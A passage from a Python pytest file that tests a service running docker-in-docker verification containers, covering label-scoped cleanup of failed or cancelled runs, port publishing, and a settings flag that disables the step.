    class FakeProc:
        returncode = 0

        def __init__(self, argv):
            seen.append(list(argv))

        async def communicate(self):
            # `docker ps -aq --filter label=…` answers one id of ours; the validator's same-named
            # container has no such label and is not listed
            return b"0123456789ab\n", b""

        async def wait(self):
            return 0

    async def fake_exec(*argv, **kw):
        return FakeProc(argv)

    monkeypatch.setattr(lvs, "run_script", hanging_run_script)
    monkeypatch.setattr(lvs.asyncio, "create_subprocess_exec", fake_exec)
    monkeypatch.setattr(lvs, "DIND_CANCELLED_RM_RETRY_SECONDS", 0.01)

    async def scenario():
        task = asyncio.create_task(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 2200))
        await asyncio.sleep(0.01)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
        await asyncio.sleep(0.05)

    asyncio.run(scenario())
    label = next(a for a in argv_seen[0] if a.startswith(f"{lvs.DIND_RUN_LABEL}="))
    token = label.split("=", 1)[1]
    ps = [a for a in seen if a[:3] == ["/usr/bin/docker", "ps", "-aq"]]
    rm = [a for a in seen if a[:3] == ["/usr/bin/docker", "rm", "-fv"]]
    assert len(ps) == 2 and all(f"label={lvs.DIND_RUN_LABEL}={token}" in a for a in ps)
    assert rm == [["/usr/bin/docker", "rm", "-fv", "0123456789ab"]] * 2
    assert not any(a[-1] == "container_hotkey_40003" for a in rm)


def test_a_failed_dind_run_removes_only_what_this_call_labelled_never_the_name(monkeypatch):
    """Regression (fresh review, 11 Sep): `docker run` exits 125 with `Conflict. The container name
    "/container_<hotkey>_<port>" is already in use` when another validator's probe of this miner
    (or the validator's own SSH-started one) holds the name — the SAME name every validator derives.
    A removal by bare name here would kill THEIR live container; by this call's label it removes
    the half-made one (a bind failure after the create) and nothing else."""

    async def fake_run_script(argv, *, timeout, env=None):
        return StepResult(
            status="failed", exit_status=125,
            stderr_tail='docker: Error response from daemon: Conflict. The container name "/container_hotkey_40003" is already in use',
        )

    removed: list[tuple[str, str | None, str | None]] = []

    async def fake_remove(name, container_id=None, run_token=None):
        removed.append((name, container_id, run_token))

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
    result = asyncio.run(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 2200))
    assert result.status == "failed"
    (call,) = removed
    assert call[0] == "container_hotkey_40003" and call[1] is None
    assert call[2] is not None and len(call[2]) == 16, "keyed by this call's run token, not the shared name"
    assert "container_hotkey_40003" not in lvs._dind_orphan_timers


def test_dind_with_port_mappings_publishes_the_internal_port(monkeypatch):
    async def fake_run_script(argv, *, timeout, env=None):
        return StepResult(status="ok", exit_status=0, stdout="cid\n")

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    pairs = lvs.parse_port_range(None, json.dumps([[8001, 40001], [8002, 40002]]))
    result = asyncio.run(lvs.run_dind(_dind(port=40002), pairs, 22))
    assert result.status == "ok" and result.data.publish_port == 8002
    lvs._dind_orphan_timers.pop("container_hotkey_40003").cancel()


def test_a_failed_docker_run_removes_the_half_made_container_and_reports_it(monkeypatch):
    async def fake_run_script(argv, *, timeout, env=None):
        return StepResult(status="failed", exit_status=125, stderr_tail="port is already allocated")

    removed: list[str] = []

    async def fake_remove(name, container_id=None, run_token=None):
        removed.append(name)

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
    result = asyncio.run(lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 22))
    assert result.status == "failed" and "already allocated" in result.stderr_tail
    assert removed == ["container_hotkey_40003"]
    assert "container_hotkey_40003" not in lvs._dind_orphan_timers


def test_a_timed_out_docker_run_is_removed_twice_like_a_cancelled_one(monkeypatch):
    """The CLI killed at the cap is the slow-daemon case: `containers/create` may land after the
    first rm found nothing, so the name is removed again after the retry delay; no by-name timer."""
    async def fake_run_script(argv, *, timeout, env=None):
        return StepResult(status="timeout", error="timed out after 20 s")

    removed: list[str] = []

    async def fake_remove(name, container_id=None, run_token=None):
        removed.append(name)

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    monkeypatch.setattr(lvs, "_remove_dind_orphan", fake_remove)
    monkeypatch.setattr(lvs, "DIND_CANCELLED_RM_RETRY_SECONDS", 0.01)

    async def scenario():
        result = await lvs.run_dind(_dind(), lvs.parse_port_range("40000-40009", None), 22)
        await asyncio.sleep(0.05)
        return result

    result = asyncio.run(scenario())
    assert result.status == "timeout"
    assert removed == ["container_hotkey_40003", "container_hotkey_40003"]
    assert "container_hotkey_40003" not in lvs._dind_orphan_timers


def test_the_suite_answers_dind_only_when_asked(fake_scripts, fake_docker, monkeypatch):
    async def fake_run_script(argv, *, timeout, env=None):
        if argv[:2] == ["/usr/bin/docker", "run"]:
            return StepResult(status="ok", exit_status=0, stdout="cid\n")
        return StepResult(status="ok", exit_status=0, stdout="x")

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    without = asyncio.run(_service(dind_enabled=True).run(_body(steps=VerifySteps(docker=True))))
    assert "dind" not in without.steps
    with_dind = asyncio.run(_service(dind_enabled=True).run(_body(steps=VerifySteps(dind=_dind()))))
    assert with_dind.steps["dind"].status == "ok"
    assert with_dind.steps["dind"].data.container_name == "container_hotkey_40003"
    lvs._dind_orphan_timers.pop("container_hotkey_40003").cancel()


def test_the_executor_flag_is_a_kill_switch_a_signed_intent_cannot_bypass(fake_scripts, fake_docker, monkeypatch):
    """EXECUTOR_LOCAL_VERIFY_DIND_ENABLED=false (the default): the step is answered `skipped`,
    never run — no `docker run` for any intent, whoever signed it. The route builds the service
    from the setting."""
    runs: list[list[str]] = []

    async def fake_run_script(argv, *, timeout, env=None):
        runs.append(argv)
        return StepResult(status="ok", exit_status=0, stdout="x")

    monkeypatch.setattr(lvs, "run_script", fake_run_script)
    answer = asyncio.run(_service().run(_body(steps=VerifySteps(docker=True, dind=_dind()))))
    assert answer.steps["dind"].status == "skipped" and "not enabled" in answer.steps["dind"].error
    assert answer.steps["docker"].status == "ok"  # the rest of the intent is answered as before
    assert not any(argv[:2] == ["/usr/bin/docker", "run"] for argv in runs)
    assert "container_hotkey_40003" not in lvs._dind_orphan_timers

    monkeypatch.setattr(apis_module, "_local_verify_service", None)
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", False)
    assert apis_module._get_local_verify_service().dind_enabled is False
    monkeypatch.setattr(apis_module, "_local_verify_service", None)
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", True)
    assert apis_module._get_local_verify_service().dind_enabled is True
    monkeypatch.setattr(apis_module, "_local_verify_service", None)


def test_version_advertises_dind_only_with_its_own_flag(client, monkeypatch):
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", False)
    assert client.get("/version").json()["capabilities"] == [CAPABILITY]
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_DIND_ENABLED", True)
    assert client.get("/version").json()["capabilities"] == [CAPABILITY, DIND_CAPABILITY]
    monkeypatch.setattr(settings, "EXECUTOR_LOCAL_VERIFY_ENABLED", False)
    assert client.get("/version").json()["capabilities"] == []
